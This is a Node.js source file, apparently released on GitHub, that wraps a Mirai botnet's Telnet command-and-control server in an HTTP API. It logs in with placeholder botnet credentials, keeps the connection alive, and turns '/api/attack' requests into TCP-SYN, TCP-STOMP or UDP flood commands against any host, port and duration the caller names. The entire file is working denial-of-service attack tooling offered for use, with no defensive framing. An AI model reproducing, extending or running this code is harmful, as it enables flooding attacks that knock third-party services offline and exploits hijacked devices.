// NodeJS Telnet API for Mirai Botnets
// Coded by forky (tg: @yfork)
// v0.0.1
// This was released on github.com/forkyyy

const express = require('express');
const net = require('net');

const app = express();
app.use(express.json());
const port = 3000;

let socket;

const cnc_host = 'BOTNET_IP';
const cnc_port =  BOTNET_PORT;

let username = "BOTNET_USER";
let password = "BOTNET_PASS";

function establishConnection() {
    socket = net.createConnection(cnc_port, cnc_host, () => {
        console.log('Connected to the Telnet server');
    });

    socket.on('close', () => {
        console.log('Disconnected from the Telnet server');
        // Re-establish connection when disconnected
        establishConnection();
    });

    socket.on('error', (error) => {
        console.log('Failed to connect to the Telnet server:', error.message);
        // Re-establish connection in case of an error
        establishConnection();
    });

    socket.write(" \r\n", () => {
        console.log("connecting...")
    });
  
    setTimeout(() => {
        socket.write(`${username}\r\n`, () => {
            console.log("username...");
            setTimeout(() => {
                socket.write(`${password}\r\n`, () => {
                    console.log("password...");
                });
            }, 500); //change this as needed based on how slow your botnet is 
        });
    }, 500); //change this as needed based on how slow your botnet is 
}


establishConnection();

const connectionCheckInterval = 30000;
setInterval(() => {
    if (!socket || socket.destroyed) {
        console.log('Connection lost. Reconnecting...');
        establishConnection();
    }
}, connectionCheckInterval);

app.get(`/api/attack`, async (req, res) => {

    const field = {
        host: (req.query.host || undefined),
        port: (req.query.port || undefined),
        time: (req.query.time || undefined),
        method: (req.query.method || undefined),
    };

    console.log(field)

    if (!socket || socket.destroyed) {
        establishConnection();
    }

    const methods = ["TCP-SYN", "TCP-STOMP", "UDP-PLAIN"];

    if (!field.host) return res.json({ status: 500, data: `invalid target` });
    if (!field.port || isNaN(field.port) || field.port < 0 || field.port > 65535) field.port = 0;
    if (!field.time || isNaN(field.time) || field.time > 60) return res.json({ status: 500, data: `invalid attack duration` });
    if (!field.method || !methods.includes(field.method)) return res.json({ status: 500, data: `invalid attack method` });

    let payload;

    if (field.port > 0) {
        target_port = ` dport=${field.port}`
    } else {
        target_port = "";
    }
  
    if (field.method == "TCP-SYN") {
        var fullCommand = `wraflood ${field.host} ${field.time} ${target_port}\r\n`;
    }
  
    if (field.method == "TCP-STOMP") {
        if (!target_port) {
            return res.json({ status: 500, data: `invalid attack port (needed for this method)` });
        }
        var fullCommand = `tcpstomp ${field.host} ${field.time} ${target_port} minsize=800 maxsize=1400\r\n`;
    }

    if (field.method == "UDP-PLAIN") {
        var fullCommand = `udpflood ${field.host} ${field.time} ${target_port} ${payload} minsize=1000 maxsize=1400\r\n`;
    }

    console.log(fullCommand)

    socket.write(fullCommand, () => {
        return res.json({ status: 200, data: `attack started` });
    });
});

app.listen(port, () => {
    console.log(`API listening at http://localhost:${port}`);
});
